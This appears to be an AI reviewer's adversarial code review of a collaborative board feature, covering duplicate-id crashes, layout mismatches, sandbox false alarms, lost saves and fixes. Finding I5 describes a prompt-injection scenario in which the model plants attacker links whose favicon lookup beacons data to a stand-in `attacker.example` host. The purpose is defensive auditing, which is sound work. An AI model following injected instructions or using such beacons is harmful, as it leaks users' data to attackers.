# RV-3 · adversarial review of the whole Canvas (Slice 3)

Reviewer: RV-3, `claude-opus-5-5`. Tree reviewed: the `rv-3` worktree at `5e74823d`, which is `feat/artifacts` with every
Canvas agent merged except S3-X. I left the PNG export, posters and the chunk budget to S3-X's re-check. Report only: I
did not fix code or commit anything. Probe copies are in `…/scratchpad/w3/rv3-probes/`: the protocol vitest probes and
two throwaway Playwright specs. I deleted them from the worktree afterwards. Screenshots are in `…/scratchpad/w3/shots/rv3/`,
all in Hungarian at 1440×900 and 390×844, light and dark. I looked at every one.

**Verdict: not ready. Ready after fixes.** Findings: **2 Critical, 6 Important, 13 Minor.**

---

## Critical

### C1 · A checklist whose items share an id bricks the whole board, and Alfy is allowed to write one
- **Where.** No uniqueness rule anywhere, so the create path, `add_node` and `update_node` all accept duplicate ids:
  - `src/lib/shared/artifacts/canvas-blocks.ts:95-106` (`checklistDataSchema`, and the strict model variant built from it)
  - `board-ops.ts:478` (`stepAddNode`) and `:554` (`stepUpdateNode`)

  The renderer then keys items by id:
  - `canvas/nodes/ChecklistNode.svelte:80` (`{#each data.items as item (item.id)}`)
  - `PhotoNode.svelte:90` has the same pattern
  - `LiveWebNode.svelte:127` has the same pattern, keyed by `id + url`

  Svelte 5.55 throws `each_key_duplicate` for this in production as well as in dev (`node_modules/svelte/.../each.js:350-355`). No
  artifact component has a `<svelte:boundary>`.
- **Scenario.** Alfy writes `{op:"add_node", node:{…, type:"checklist", data:{kind:"checklist", items:[{id:"1",…},{id:"1",…}]}}}`.
  A model re-numbering items can easily produce this. `validateBoardDiff` accepts it (probe P3), and so does the create
  parse. When the board is opened, the panel stays on the loading skeleton forever: no nodes, no toolbar, and the page
  error `Keyed each block has duplicate key "1" … in ChecklistNode.svelte`.
  - Evidence: probe B (`probe-B-dup-checklist.png`).
  - A reload does not help.
  - A board made this way by `create_artifact` can only be deleted, and Regenerate rebuilds the same broken board.
  - An edit that introduced it can only be undone through Versions, and only if the reader thinks to open them.
- **Why it matters.** A normal model slip loses the reader's board, and the model is told the edit succeeded.
- **Smallest fix.**
  1. The model's strict schemas refuse duplicate item ids with a named refusal, for example "checklist item ids must be
     unique: "1" is used twice". Use a `superRefine` on the model variant only.
  2. `normalizeCanvasBody` repairs duplicates on read (`1` → `1-2`) instead of dropping the block. Report the repair,
     never lose content silently.
  3. Each block's `each` keys by the normalized id. The client must never meet a duplicate.
  4. Optional: a `<svelte:boundary>` per node's content that draws the "could not draw this block" card
     (`MissingKindNode`) instead of taking the board down.
- **Failing tests.**
  ```ts
  // board-ops.test.ts
  const judged = validateBoardDiff({ id: "d", summary: "s", ops: [{ op: "add_node", node: { id: "dup", type: "checklist",
    position: { x: 0, y: 900 }, data: { kind: "checklist", items: [{ id: "1", text: "a", done: false }, { id: "1", text: "b", done: false }] } } }] }, sampleBoard());
  expect(judged.accepted).toEqual([]);                      // fails today: accepted
  expect(judged.refused[0]).toMatchObject({ reason: "invalid_data" });
  // canvas-body.test.ts: normalizeCanvasBody keeps the node and makes the ids unique
  // e2e: seedCanvas(board with that checklist) → openCanvasPanel → expect(getByTestId("canvas-checklist").getByRole("checkbox")).toHaveCount(2)
  ```

### C2 · What Alfy makes is not drawn the size Alfy is told, so Alfy's boards spill out of their frames
- **Where.**
  - The model makes blocks with no width:
    - `add_node` has no width field.
    - `applyOp`'s `add_node` stores none (`board-ops.ts:249-262`).
    - The create parse builds `add_node` ops the same way (`canvas-model.ts:420-435`).
  - The board draws a block with no width at its content's width, with no cap:
    - `board-model.ts:49-59`: `toFlowNodes` gives only frames a size.
    - `StickyNode.svelte:90-99` has no width or max-width.
  - The model is told the opposite, in the tool text: "A note is 190 wide and 84 tall". Its read reports 190×84 for every
    unsized block (`canvas-model.ts:100-101`).
  - The eval scores against the same assumption (`scripts/eval-artifact-contracts/suites/canvas.ts:309-318`, `sizeOf`).
  - The Insert menu gives the reader's own blocks a width (`block-meta.ts` sticky 200×120), so only Alfy's are affected.
- **Scenario.** Probe J (`probe-J-note-widths.png`) uses a 420-wide frame. Alfy's note with 120 characters of ordinary
  Hungarian itinerary text has no stored width and is drawn **861×63**: one line through the frame's edge and across the
  board. The same note with `width: 190` is drawn 186×**124**, taller than the "84" the model plans with. Chart blocks
  Alfy adds without a width overlap each other the same way (probe K).
  - Short notes look fine, which is why no screenshot so far caught it. My own walk's "Ebéd a Nagycsarnokban" already grew
    to 185 px.
  - S3-T's "overlaps 4 → 0 / 24 of 30 good" is measured against a geometry the reader never sees.
- **C2b.** `create_artifact`'s one worked example breaks the rule stated right after it
  (`kind-prose.ts:52-75`, `CREATE_ARTIFACT_CANVAS_BODY_EXAMPLE`):
  - The "lunch" note sits at y 150, height 84, inside a frame 220 high, so its bottom edge is at 234.
  - It is 6 below "museum", where the rule says 10 or more.
  - The eval's own scorer rejects it (probe P1): `sticky "lunch" at (20, 150) sticks out of frame "sat" (300x220)`.
  - This is the exact "layout arithmetic" failure S3-T measured (3 of 30).
- **Why it matters.** "Alfy arranges a board" is the Canvas's main flow. With realistic note text, the owner's first
  Alfy-made board will have notes running out of frames and over each other.
- **Smallest fix.**
  1. In `applyOp`, `add_node` stores `width: NODE_WIDTH` for every non-frame block the model adds. That covers the create
     parse too, since it goes through `applyOp`. The canonical body then carries the width, and the read, the eval and
     the board all measure the same box.
  2. For boards already stored, `toFlowNodes` gives any unsized non-frame node its kind's default width.
  3. Say the truth about height in the tool text, for example "a note is 190 wide; its height grows with its text, about
     84 for two short lines and about 18 more per extra line". The eval's `sizeOf` estimates height the same way, or
     measures it in its browser pass.
  4. Fix the example: move "lunch" to y 160 and make the frame 270 high.
  5. Regenerate the catalogue snapshots and re-measure the ceiling (ruling 62).
- **Failing tests.**
  ```ts
  // kind-prose / canvas-model test
  const made = parseCanvasCreateBody(JSON.stringify(CREATE_ARTIFACT_CANVAS_BODY_EXAMPLE));
  expect(frameProblems(made.body)).toEqual([]);           // fails today (C2b)
  // board-ops.test.ts
  const next = applyOp(board, { op: "add_node", node: { id: "n", type: "sticky", position: { x: 0, y: 0 }, data: { kind: "sticky", text: "x", tone: "yellow" } } });
  expect(next.nodes.at(-1)?.width).toBe(NODE_WIDTH);      // fails today: undefined
  // e2e: a model-made 120-character note in a 420-wide frame: nodeBox(note).x + width <= nodeBox(frame).x + width
  ```

---

## Important

### I1 · Dragging an App block into a frame shows a false "this App tried to leave its sandbox" alarm and resets the App
- **Where.**
  - `CanvasBoard.svelte:518`: on drop, `parentsFirst` reorders the nodes so the frame comes before the App. The App
    block's DOM node moves, and the iframe is reinserted and reloads.
  - `app/AppFrame.svelte:396-410`: `trackFrameLoad` treats any second `load` on the same element as the App navigating
    itself.
- **Scenario.** Probe A (`test-results …/zz-rv3-probes-A…/test-failed-1.png`, described here):
  1. Place an App block.
  2. Add a frame that comes after it in the list, which is the usual order when you draw a frame around an App you
     already have.
  3. Drag the App into the frame.

  The stored order becomes `frame-late,app-1`, and the block shows "Ez az alkalmazás megpróbálta elhagyni a homokozóját,
  ezért Alfy leállította." (in English: "This app tried to leave its sandbox, so Alfy stopped it") with an "Alkalmazás
  újratöltése" button. The App's in-memory state (a counter at 2) is gone.
- **Why it matters.** The security notice accuses a clean App on an ordinary drag, which teaches the owner to ignore the
  real alarm. The App also loses unsaved state.
- **Smallest fix.**
  - In `AppFrame`, remember the `contentWindow` the first load armed.
  - A load with a different `contentWindow` means a new browsing context, i.e. the element was reinserted. Treat it as a
    fresh first load and re-arm.
  - Trip only when the same WindowProxy loads again, which means the App navigated itself.
  - Keep the existing navigation-tripwire test green. Optionally, avoid moving App nodes in the DOM at all.
- **Failing test.** An e2e like probe A: after the drag,
  `expect(page.getByRole("alert")).toHaveCount(0)` and `expect(page.locator("iframe.app-frame")).toHaveCount(1)`. Also a
  unit test on `AppFrame`: remove and re-insert the iframe node, and the tripwire stays off.

### I2 · A step the reader is still saving is lost when Alfy's change lands, and the banner blames "someone" who was "drawing"
- **Where.**
  - `canvas/CanvasEditor.svelte:257-266`: a stale save goes to `conflict` and stops. "Újratöltés" (Reload) reloads the
    server's board.
  - The chat page does not flush the open board's pending save before a turn is sent. The `@Alfy` path does, through
    `saveBoardNow`.
  - The string is `artifacts.canvas.saveConflict`.
- **Scenario.**
  - In the owner's walk at 1440 dark: insert a note, then ask Alfy in the chat.
  - In probe G: insert a Text block, type "Az én jegyzetem", then ask Alfy.

  Alfy's version lands first, and the reader's autosave is refused. The banner says "Valaki módosította a táblát, amíg
  rajzoltál. Töltsd újra…" ("Someone changed the board while you were drawing. Reload…"). The versions are only v1 and
  v2, both Alfy's. After the one offered action, Reload, the reader's text is gone
  (`G-conflict.png`, `G-after-reload.png`).
  - With a real model the window is the whole tool call: a reader who keeps working on the board while "Alfy épp
    rendezi…" (Alfy is arranging) is showing loses the last step.
- **Why it matters.** Silent loss of the reader's work in the main collaborative flow, and the banner names neither
  Alfy nor the loss.
- **Smallest fix.**
  1. Flush the open body's pending save before a chat turn is sent: a `flush` the body registers through
     `ArtifactBodyProps`, which the page awaits.
  2. On a stale save, rebase instead of stopping:
     - read the new board;
     - re-apply the reader's unsaved delta, which is `diffBoards(savedBoard, localBoard)` (added, changed and moved
       nodes, edges and marks);
     - save that as the reader's step.
     
     At minimum, say "Az utolsó lépésed nem mentődött el" ("Your last step was not saved") and do not make Reload the
     only way out.
  3. Reword the string. Alfy's own writes are the usual cause, and the reader was not necessarily drawing.
- **Failing test.** An e2e like probe G: after Alfy's change lands, `storedBoard(id).nodes` contains the reader's text
  block, and the stored versions end with a user version after Alfy's.

### I3 · Undo, then Redo, then Undo again dead-ends, and the card counts a change the server does not have
- **Where.** `canvas/_lib/review-controller.svelte.ts`:
  - `:508-531`: Redo writes Alfy's board back as a **user** version, then sets `status = "pending"` and
    `reportCount(this.count)`.
  - `:437-459`: the next Undo re-reads the server's review, which says 0 pending (the last versions are the reader's),
    and refuses with "failed".
- **Scenario.** Probe I (`I-after-redo.png` and the failure shot).
  1. After the change lands, press Visszavonom (Undo). It is undone.
  2. Press Újra (Redo). The pill shows Keep/Undo again, and the card says "4 módosítás vár rád" (4 changes waiting for you).
  3. Press Visszavonom again. The pill and rings vanish, and "Nem sikerült visszavonni Alfy módosítását…" (Could not undo
     Alfy's change…) appears.
  
  The card still says 4 waiting. After a reload the server says reviewed. Card, panel and server disagree, which breaks
  ruling 63's single source for the count.
- **Smallest fix.** Pick one:
  - Redo writes the version back **as Alfy's**: author `alfy`, Alfy's own summary, marker unchanged. Then the server's
    review, the pill and the card agree, and Undo works again.
  - Or Redo acknowledges and shows "Kept".
- **Failing test.** E2E: land, Undo, Redo, Undo. Expect the stored board to equal the parent version's board, no refusal
  notice, and the card's count to equal `fetchCanvasReviewState().count` after each step and after a reload.

### I4 · The Comment tool comments on whatever was selected, not on the block the reader clicks
- **Where.** `canvas/CommentCatcher.svelte:67-72` ("A block that is selected when the tool is armed takes the comment at
  once"). An insert selects the new block, so the block most often selected is the one just inserted.
- **Scenario.** Probe C (`probe-C-1440-*`, `probe-C-390-*`).
  - Desktop:
    1. Insert a note. It is auto-selected.
    2. Press Comment. The composer opens at once as "Új megjegyzés ehhez: Jegyzet" ("New comment on: Note").
    3. Click the Museum note. The composer keeps the old target.
    4. Send. The stored anchor is the inserted note (`sticky-munvogn8-1`), not `museum`.
  - Phone: the sheet opens at once on the inserted note. Tapping the intended block dismisses the sheet and throws the
    draft away.
- **Smallest fix.** While the draft is still empty, a click on another block moves it to that block. On a phone, the
  sheet header offers "Válassz másik blokkot" ("Choose another block"). Alternatively, take the selection at once only
  when it was a deliberate selection rather than the insert's auto-selection.
- **Failing test.** E2E like probe C: after the click on `museum`, the stored comment's `anchor_json` is
  `{"kind":"node","nodeId":"museum"}`.

### I5 · `update_node` lets the model rewrite what the app vouches for (S3-P open question 2, S3-R2's residual)
- **Where.** `board-ops.ts:528-561` (`stepUpdateNode`) validates the merged data against the kind's full, lenient stored
  schema. Probe P2 shows all five rewrites accepted:
  - a live-web block's `sources`, `query` and `fetchedAt`
  - a photo block's `items`
  - a file block's `fileId` and `name`
  - an App block's `artifactId`
  - any block's `poster`
- **Why it matters.** A prompt-injected turn can put attacker links, dressed as a search result with a fresh "Frissítve"
  (Updated) line, into a block that claims to be the app's own search. Each source's favicon then makes the app server
  contact an attacker-chosen hostname on every render: the unauthenticated `/api/favicon?domain=<data>.attacker.example`
  resolves DNS and fetches `/favicon.ico`, which works as a beacon.
  
  I checked this is not a new exfiltration power. `fetch_url` and `research_web` already reach arbitrary hosts. The
  point is integrity and persistence: the beacon is stored in the board and fires on every open. For S3-X: a
  model-writable `poster.fileId` must never become an `<img>` path.
- **My answer to "acceptable, or an allow-list?": allow-list.**
  - For the five app-owned kinds, the model may change only descriptive fields: map `label`, `route` and `meta`; App
    `title`.
  - Everything else is refused with `invalid_data`, naming what may change and saying the rest is set by the Insert menu
    or Refresh.
  - `poster` is never model-writable.
  - This amends ruling 64's "`update_node` … validated against that kind's own full schema", so it needs the
    orchestrator's ruling.
- **Failing test.** `validateBoardDiff` with each rewrite from probe P2 gives `accepted: []` and one `invalid_data` per op.
  Today all five are accepted.

### I6 · Alfy's edit can silently overwrite a note the reader changed after Alfy read the board
- **Where.** `normal-chat-tools/artifact-tools/edit.ts:407-421`: `applyBoardOps` takes the newest version itself, so the
  `baseVersionId` check in `services/artifacts/ops.ts:180-188` never fails on the tool path. Every op is judged only
  against the current board.
- **Scenario.** This is the brief's question:
  1. Alfy reads the board at v1.
  2. The reader rewrites note X (v2, a user version, or v1 in place if it coalesces).
  3. Alfy's `update_node X {text}` lands as v3 and replaces the reader's words.

  The Document refuses the same situation, because its patches carry the `baseHash` the model read. On a board, the only
  way back is Undo, which is refused once the reader touches anything else, then History.
- **Smallest fix.** This is an owner decision.
  - The tool registry remembers, per turn, the `versionId` each `read_artifact` of the board returned, and passes it as
    `baseVersionId`.
  - The envelope then refuses as `stale` any op that addresses a node whose content differs between that version and
    now. The refusal names the node and says "the reader changed it; read again".
  - Or the gap is accepted and written into ruling 63.
- **Failing test.** Seed v1, save the same note's text as the user (v2), then run the canvas edit handler with
  `update_node` on that note. The result should refuse it as `stale`; today it is applied as v3.

---

## Minor

1. **Insert drops a new block on top of what is already there.**
   - `CanvasBoard.svelte:376-400` and `_lib/placement.ts:19-36`: `placeInsertedBlock` staggers only off blocks sitting at
     exactly the same corner.
   - Probe C: the new note covered the Museum note completely, and its tone toolbar ate my click.
   - Walk step 09: the inserted checklist covered "Hétvégi terv".
   - Use `placeBesideBlocks`, S3-R1's free-ground search, for note-shaped inserts too.
2. **The change pill and the landing need better placement.**
   - The pill sits over untouched blocks (walk 04: over the Csomagolás checklist).
   - A landing does not pan, so Alfy's new "Vasárnap" frame lay under the floating toolbar. This was accepted for S3-A;
     at least pan when the whole change is off-screen.
   - On a phone the pill's Megtartom/Visszavonom buttons are 20 px tall (probe H). The review bar's buttons are full
     size, so this is secondary.
3. **Phone targets inside the board are too small.**
   - Connection anchors are 9 px, and 5 px at fit zoom. Resize corners are 8 px. Neither gets a larger hit area under
     `(pointer: coarse)` (`NodeShell.svelte:448-476`), so connecting or resizing with a finger is impractical.
   - Add an invisible hit area of about 24 px, under `(pointer: coarse)` only.
4. **Arrowheads are never drawn.** The stored direction ("Múzeum → Ebéd") is invisible. This is S3-F's question 1; the
   fix is one `markerEnd` line.
5. **Edge ids can collide with node ids, and self-loop edges are accepted** (probe P6). The model's read lists both
   entries with one id.
6. **`POST /api/artifacts/[id]/ops` writes Alfy-authored versions with the caller's own summary.** It is callable from
   the browser and no UI uses it. Either write `author: "user"` from the route, or remove the route until there is a
   caller.
7. **Duplicated logic.**
   - "Parents first" is implemented three times: `canvas-body.ts` `settleFrames`, `canvas-model.ts` `parentsFirst`, and
     `_lib/board.ts` `parentsFirst`.
   - The review-marker bootstrap in `services/artifacts/ops.ts` repeats `applyDocumentPatch`'s.
   - `canvas-review.ts:142-151` is a Fallow clone of `document-ops.ts:885-895`.
8. **Hungarian, read as a native speaker.** These strings need rewording:
   - Redo: "Saját lépés újra" (literally "own step again") → "Saját lépés ismét".
   - Offline notice: "…és visszatér a mentés, amint újra van hálózat" ("…and the saving comes back once there is network
     again") → "…a módosításaidat a kapcsolat helyreálltával mentjük".
   - `comment.placed`: "A megjegyzés elkezdve." ("The comment started.") → "Megjegyzés indítva — írd meg a listában."
   - Arranging: "Alfy épp rendezi…" ("Alfy is just arranging…", no object) → "Alfy dolgozik a táblán…".
   - Stale badge: "Nem élő" ("Not live") → "Elavult" ("Out of date").
   - Missing block: "A blokk már nincs meg." ("The block is no longer there", colloquial) → "A blokk már nem létezik."
   - Checklist hint: "…pipák a táblával együtt mentődnek" (awkward verb form) → "…a kipipált elemeket a táblával együtt
     mentjük".
   - "{left} módosítást nem érintett" ("did not touch {left} changes") → "{left} módosítást kihagyott" ("skipped
     {left} changes").
   
   The conflict string is covered under I2.
9. **Two controls share one accessible name.** `artifacts.canvas.zoom` and `zoomIn` are both "Nagyítás". Make the zoom
   level "Nagyítás mértéke".
10. **A touched frame's label is struck through by its ring border** (walk 04 and 05, "Vasárnap").
11. **Rings stay on for about 2 s after Undo** (walk 07 and 09), although the Undo drawing is meant to have no ring.
12. **Known accessibility gaps, for S6's focus pass.** The Insert popover's first focus is its Close button. The photo
    lightbox has no focus trap.
13. **Pre-existing and shared, just noting.**
    - The comment composer's send button shows a Return icon, but Enter makes a new line (Ctrl/Cmd+Enter sends).
    - Workspace Search shows the Canvas with a grid icon, while the card uses `Shapes` from `kind-icons.ts`.

---

## Fix plan · three clusters, disjoint files

- **A. Protocol and the model's contract** (server and shared, one agent)
  - Findings: C1 (the model schema refusal and repairing duplicates on read), C2 (`applyOp` width, tool text, example,
    eval `sizeOf`, snapshots and ceiling), I5 (allow-list, after the ruling), I6 (if the owner wants it), Minor 5 and 6,
    and Minor 7's shared "parents first".
  - Files:
    - `src/lib/shared/artifacts/{canvas-blocks,board-ops,canvas-body}.ts`
    - `services/artifacts/ops.ts`
    - `normal-chat-tools/artifact-tools/{canvas-model,kind-prose,edit}.ts`, plus `normal-chat-tools/index.ts` only if I6
      needs turn memory
    - `normal-chat-tools/tool-catalogue.{en,hu}.snapshot.txt` and the ceiling test
    - `scripts/eval-artifact-contracts/suites/canvas.ts`
    - `src/routes/api/artifacts/[id]/ops/+server.ts`
- **B. The board UI** (one agent)
  - Findings: C1 (keys, plus an optional `<svelte:boundary>`), C2 (default width for unsized nodes when drawn), I3
    (Redo), I4 (comment target), Minor 1, 2, 3, 4, 9, 10 and 11, the Hungarian strings in Minor 8, and I2's reworded
    `saveConflict` string.
  - Files:
    - `canvas/nodes/{ChecklistNode,PhotoNode,LiveWebNode,StickyNode,TextNode}.svelte`
    - `canvas/_lib/{board-model,placement,review-controller.svelte,block-meta}.ts`
    - `canvas/{CanvasBoard,CommentCatcher,CanvasComments,AlfyChangeLayer,NodeShell}.svelte`
    - `src/lib/i18n/artifacts.ts`
- **C. The App frame and the reader's unsaved step** (one agent)
  - Findings: I1, and I2's flush-before-send and rebase-on-stale logic. Cluster B owns the wording.
  - Files:
    - `components/artifacts/app/AppFrame.svelte` (+ its test)
    - `canvas/CanvasEditor.svelte`
    - `components/artifacts/artifact-bodies.ts` (a `flush` in `ArtifactBodyProps`)
    - `document-workspace/DocumentWorkspace.svelte`
    - `routes/(app)/chat/[conversationId]/+page.svelte` (await it before sending)

A and B can run side by side. C's files are disjoint from both. The only coupling is that C1's normalized ids (A) must
be what B's keys use; B can key by index plus id, which is safe either way. I5 needs the orchestrator's ruling before A
builds it.

---

## What I checked and found right (so the re-check can skip it)

- **Canonical JSON and hash.**
  - A no-edit round trip keeps the hash, including recursively reversed key order and 1e-10 float noise (probe P4).
  - The camera is excluded from "changed", so a pan never saves.
  - In the walk logs, no user version was written by a landing, by review-bar stepping (which moves the camera), or by a
    reload.
- **The validation order is sound.**
  - The schema runs first; a batch over 40 ops is a 400 carrying the valid ops.
  - Each op is judged against the running board.
  - A partly refused batch stays coherent: removing a frame re-homes its children, and a removed node's edges go with it.
  - Refusals name the fix: `unknown_id` lists the ids, `missing_parent` lists the frames, `unknown_kind` lists the five
    kinds, `invalid_data` lists the fields, and S3-Y's `kind_mismatch` names `remove_node` and `add_node`.
  - Body caps and the 400-node cap are refusals, never truncation. Drops are reported (`dropped` and the notice).
- **What the model is shown is what is parsed (ruling 62).**
  - The edit tool advertises `boardOpsArraySchema`, and the envelope parses the same object through `boardDiffSchema`.
  - The `@Alfy` schema strip removes only `$schema` and exactly `propertyNames:{"type":"string"}`. That is lossless, and
    replies are parsed with the unstripped zod schema.
  - The HU clauses S3-T and S3-Y asked about read naturally.
- **Ownership.**
  - Every Canvas route resolves through `readScopedArtifactRow` and answers the identical
    `{"ok":false,"reason":"not_found"}` 404.
  - The containment suite passes 47/47.
  - `chat-blocks` checks the board's conversation against the caller's scope.
  - The liveweb route validates its body before ownership, so an error leaks nothing about existence.
  - There is no board text in any log line of the new server modules.
- **Refresh and live web.**
  - Only the stored query is sent, through the one `research_web` module, with a 45 s race, abort on disconnect, and a
    throttle. The route writes nothing.
  - The photo rule is exactly the Immich proxy path, and the proxy scopes `connectionId` by user.
  - Source links carry `rel="noopener noreferrer"`.
- **The App block** is the panel's `AppFrame`, with the exact sandbox string and the App's own kv id. Every message
  listener checks its own frame's `contentWindow`. There is no new path out of the sandbox; I1 is a false positive, not
  an opening.
- **The review.**
  - A pending change survives a reload, and there is no double landing on re-mount.
  - Card, bar and pill agreed: 4/4, and 3/3 for an op list with duplicates, an edge between two blocks and a highlight
    (probe F). The exception is after Redo (I3).
  - A highlight writes nothing.
- **Delete and Regenerate.** The deleted card shows. Regenerate rebuilds the board under the same id, from the kept
  create arguments, as v1 (probe E).
- **Where the Canvas shows up.** The Knowledge "Dokumentumok" tab lists the Canvas (probe H), and Workspace Search finds
  it as "Tábla" (probe E).
- **Owner's walk, the parts that work.**
  - Card to panel, the Insert menu (desktop popover and phone sheet), and "Ebből a beszélgetésből" with files, Apps, maps,
    charts, photos and web searches (the S3-R1 and S3-R2 shot suites re-run into `shots/rv3/r1` and `r2`).
  - Drawing and its tray, the comment column and sheet, and a landing with Keep and Undo.
  - Reload, and the review bar's prev/next centring the camera.
  - Dark mode tokens, and the phone review bar.
  - Charts that Chart.js cannot draw show a graceful "source shown instead" card.
- **Gates.**
  - `npm run build` is clean: 32 unused-CSS lines and 2 ARIA-role lines, which is the baseline.
  - Chunk guard: the CanvasEditor chunk is **67.9 kB gzip**, and **74.1 kB** with the 7 chunks it loads itself. The
    budget is 65 kB, so this is left to S3-X. The guard's `--allow-entry` exclusions are honest: the note-shaped nodes
    are in the editor chunk, and only the chat-made blocks are lazy.
  - Fallow: 124 issues and 4 circular, the baseline, so nothing new.
  - Reduced motion is covered globally by `app.css`.
  - The touched Svelte files have no new legacy idioms.

Screenshots referenced above (in `…/scratchpad/w3/shots/rv3/`):
- `{1440,390}-{light,dark}-NN-*.png`: the walk.
- `probe-*.png`, and `F-*`, `G-*`, `H-*`, `I-*`: the probes.
- `r1/`, `r2/`: the S3-R1 and S3-R2 shot suites.
